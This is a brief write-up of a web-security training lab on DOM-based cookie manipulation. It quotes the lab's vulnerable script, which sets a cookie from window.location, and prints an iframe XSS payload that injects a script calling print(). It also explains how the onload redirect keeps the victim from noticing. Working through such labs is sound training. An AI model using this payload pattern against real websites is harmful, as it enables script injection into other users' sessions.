Here's the payload of this lab:
```
<iframe src="https://<link of lab>product?productId=1&'><script>print()</script>" onload="if(!window.x) this.src='https://<link.of.lab>';window.x=1;' ">
```

In the lab source code, there's a code that show the website has vulnerable to cookie manipulation.

```
...
<script>
        document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
...
```

So, after the link of `the last viewed product`, we have to add `&` and `'` symbol for continuing the XSS payload and closing the `'` in the vulnerable website. Because I think that the `window.location` will execute the `print()` through URL.

The `onload` attribute will make the victim redirect to the hompage without suspecting for being attacked, the `window.x=1;` is used for displaying the hompage once only, it will refresh the page mutiple times if we don't change it to `1`.
